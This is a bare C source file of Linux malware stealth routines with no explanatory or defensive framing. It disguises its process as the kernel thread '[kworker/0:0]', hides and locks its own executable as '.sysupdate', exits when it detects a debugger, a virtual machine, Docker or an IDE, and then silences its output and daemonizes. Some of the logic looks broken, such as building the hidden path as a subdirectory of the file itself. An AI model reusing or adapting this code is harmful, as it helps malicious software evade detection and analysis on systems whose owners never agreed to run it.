#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <dlfcn.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/magic.h>
#include <sys/vfs.h>

int hide_process(const char *proc_name) {
    prctl(PR_SET_NAME, (unsigned long)proc_name, 0, 0, 0);
    
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/status", getpid());
    
    int fd = open(path, O_RDWR);
    if (fd < 0) return 0;
    
    char buffer[4096];
    ssize_t bytes = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes > 0) {
        buffer[bytes] = '\0';
        char *name_ptr = strstr(buffer, "Name:");
        if (name_ptr) {
            char *newline = strchr(name_ptr, '\n');
            if (newline) {
                memset(name_ptr + 6, ' ', newline - name_ptr - 6);
            }
        }
    }
    close(fd);
    return 1;
}

int hide_file(const char *file_path) {
    char new_path[512];
    snprintf(new_path, sizeof(new_path), "%s/.%s", file_path, "sysupdate");
    
    if (rename(file_path, new_path) == 0) {
        chmod(new_path, 0000);
        return 1;
    }
    return 0;
}

int is_debugger_present() {
    int status_fd = open("/proc/self/status", O_RDONLY);
    if (status_fd < 0) return 0;
    
    char buffer[4096];
    ssize_t bytes = read(status_fd, buffer, sizeof(buffer) - 1);
    close(status_fd);
    
    if (bytes <= 0) return 0;
    buffer[bytes] = '\0';
    
    char *tracer = strstr(buffer, "TracerPid:");
    if (tracer) {
        int pid = atoi(tracer + 10);
        return pid > 0;
    }
    return 0;
}

int is_virtualized() {
    int fd = open("/proc/cpuinfo", O_RDONLY);
    if (fd < 0) return 0;
    
    char buffer[4096];
    ssize_t bytes = read(fd, buffer, sizeof(buffer) - 1);
    close(fd);
    
    if (bytes <= 0) return 0;
    buffer[bytes] = '\0';
    
    if (strstr(buffer, "hypervisor") || strstr(buffer, "kvm") || 
        strstr(buffer, "vmware") || strstr(buffer, "virtualbox")) {
        return 1;
    }
    return 0;
}

int check_analysis_env() {
    char *env_vars[] = {"VIRTUAL_ENV", "PYCHARM_HOSTED", "JETBRAINS_IDE", 
                        "VSCODE_PID", "DOCKER", "container", NULL};
    
    for (int i = 0; env_vars[i]; i++) {
        if (getenv(env_vars[i])) return 1;
    }
    
    return 0;
}

void setup_stealth() {
    if (is_debugger_present() || is_virtualized() || check_analysis_env()) {
        exit(0);
    }
    
    hide_process("[kworker/0:0]");
    
    char self_path[512];
    readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    hide_file(self_path);
    
    int fd = open("/dev/null", O_RDWR);
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    close(fd);
}

int daemonize() {
    pid_t pid = fork();
    if (pid < 0) return 0;
    if (pid > 0) exit(0);
    
    setsid();
    
    pid = fork();
    if (pid < 0) return 0;
    if (pid > 0) exit(0);
    
    umask(0);
    chdir("/tmp");
    
    for (int i = 0; i < 1024; i++) {
        close(i);
    }
    
    return 1;
}